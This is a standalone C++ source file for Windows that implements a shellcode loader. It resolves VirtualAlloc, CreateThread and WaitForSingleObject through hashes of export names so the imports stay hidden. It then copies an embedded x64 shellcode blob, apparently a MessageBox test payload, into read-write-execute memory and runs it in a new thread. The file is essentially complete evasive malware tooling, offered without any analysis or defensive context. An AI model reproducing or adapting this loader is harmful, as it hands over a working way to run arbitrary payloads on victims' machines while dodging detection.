#include <Windows.h>
#include <iostream>

DWORD CalculateHash(const char* functionName) {
    DWORD hash = 0x35;  

    while (*functionName) {
        hash = (hash * 0xab10f29f) + (*functionName);
        hash &= 0xFFFFFF;  
        functionName++;
    }

    return hash;
}

HMODULE GetModuleBase(const char* moduleName) {
    HMODULE hModule = GetModuleHandleA(moduleName);
    return hModule;
}

FARPROC ResolveFunctionByHash(HMODULE hModule, DWORD targetHash) {
    if (!hModule) return nullptr;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);

    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);

    DWORD* namesRVA = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* functionName = (const char*)((BYTE*)hModule + namesRVA[i]);

        DWORD hash = CalculateHash(functionName);

        if (hash == targetHash) {
            WORD ordinal = ((WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals))[i];

            DWORD functionRVA = ((DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions))[ordinal];
            FARPROC functionAddress = (FARPROC)((BYTE*)hModule + functionRVA);

            return functionAddress;
        }
    }

    return nullptr;  
}

unsigned char shellcode[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x19\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
"\x00\x3e\x4c\x8d\x85\x13\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
"\x56\xff\xd5\x6a\x6f\x61\x73\x00\x68\x65\x6c\x6c\x6f\x00"
"\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

int main() {
    DWORD hashVirtualAlloc = 0xE0DABF;
    DWORD hashCreateThread = 0xF92F7B;
    DWORD hashWaitForSingleObject = CalculateHash("WaitForSingleObject");

    std::cout << "Hash calculated for WaitForSingleObject: 0x" << std::hex << hashWaitForSingleObject << std::endl;

    HMODULE hKernel32 = GetModuleBase("kernel32.dll");

    if (!hKernel32) {
        std::cerr << "Could not retrieve the base address of kernel32.dll.\n";
        return -1;
    }

    typedef LPVOID(WINAPI* pVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    pVirtualAlloc_t pVirtualAlloc = (pVirtualAlloc_t)ResolveFunctionByHash(hKernel32, hashVirtualAlloc);
    if (!pVirtualAlloc) {
        std::cerr << "Could not find VirtualAlloc.\n";
        return -1;
    }
    std::cout << "Hash calculated for VirtualAlloc: 0x" << std::hex << hashVirtualAlloc << std::endl;

    typedef HANDLE(WINAPI* pCreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    pCreateThread_t pCreateThread = (pCreateThread_t)ResolveFunctionByHash(hKernel32, hashCreateThread);
    if (!pCreateThread) {
        std::cerr << "Could not find CreateThread.\n";
        return -1;
    }
    std::cout << "Hash calculated for CreateThread: 0x" << std::hex << hashCreateThread << std::endl;

    typedef DWORD(WINAPI* pWaitForSingleObject_t)(HANDLE, DWORD);
    pWaitForSingleObject_t pWaitForSingleObject = (pWaitForSingleObject_t)ResolveFunctionByHash(hKernel32, hashWaitForSingleObject);
    if (!pWaitForSingleObject) {
        std::cerr << "Could not find WaitForSingleObject.\n";
        return -1;
    }

    std::cout << "Hash calculated for WaitForSingleObject: 0x" << std::hex << hashWaitForSingleObject << std::endl;

    LPVOID execMem = pVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        std::cerr << "Failed to allocate memory.\n";
        return -1;
    }

    memcpy(execMem, shellcode, sizeof(shellcode));

    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create thread.\n";
        return -1;
    }

    pWaitForSingleObject(hThread, INFINITE);

    return 0;
}
